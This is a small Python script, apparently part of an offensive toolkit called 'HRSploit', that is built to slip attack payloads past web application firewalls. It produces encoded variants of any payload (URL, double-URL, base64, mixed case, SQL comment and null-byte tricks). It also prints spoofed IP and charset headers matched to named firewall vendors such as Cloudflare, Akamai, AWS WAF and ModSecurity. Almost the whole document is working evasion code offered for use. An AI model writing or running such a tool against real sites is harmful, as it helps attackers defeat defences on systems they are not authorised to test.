#!/usr/bin/env python3
"""HRSploit Evasion Engine"""
import sys,base64,re
from urllib.parse import quote
from datetime import datetime
def log(t,m): print(f"[{datetime.now().strftime('%H:%M:%S')}][{t}] {m}",flush=True)
TECH={"url":lambda p:quote(p),"double":lambda p:quote(quote(p)),"b64":lambda p:base64.b64encode(p.encode()).decode(),
      "case":lambda p:"".join(c.upper() if i%2==0 else c.lower() for i,c in enumerate(p)),
      "comment":lambda p:re.sub(r"\\s+","/**/",p),"null":lambda p:p.replace(" ","\x00")}
WAF_HEADERS={"Cloudflare":{"CF-Connecting-IP":"127.0.0.1","X-Forwarded-For":"127.0.0.1"},
              "Akamai":{"X-True-Client-IP":"127.0.0.1"},"AWS WAF":{"X-Amzn-Trace-Id":"Root=1-0-1"},
              "ModSecurity":{"Content-Type":"application/x-www-form-urlencoded; charset=IBM037"},
              "Generic":{"X-Forwarded-For":"127.0.0.1","X-Remote-IP":"127.0.0.1"}}
def evade(payload,waf="Generic"):
    variants={"original":payload}
    for name,fn in TECH.items():
        try: variants[name]=fn(payload)
        except: pass
    headers=WAF_HEADERS.get(waf,WAF_HEADERS["Generic"])
    return {"variants":variants,"bypass_headers":headers}
if __name__ == "__main__":
    payload=sys.argv[1] if len(sys.argv)>1 else input("Payload: ").strip()
    waf    =sys.argv[2] if len(sys.argv)>2 else "Generic"
    result =evade(payload,waf)
    log("EVASION",f"WAF: {waf}")
    for name,val in result["variants"].items(): print(f"  [{name}] {val}")
    print(f"\nBypass headers:"); [print(f"  {k}: {v}") for k,v in result["bypass_headers"].items()]
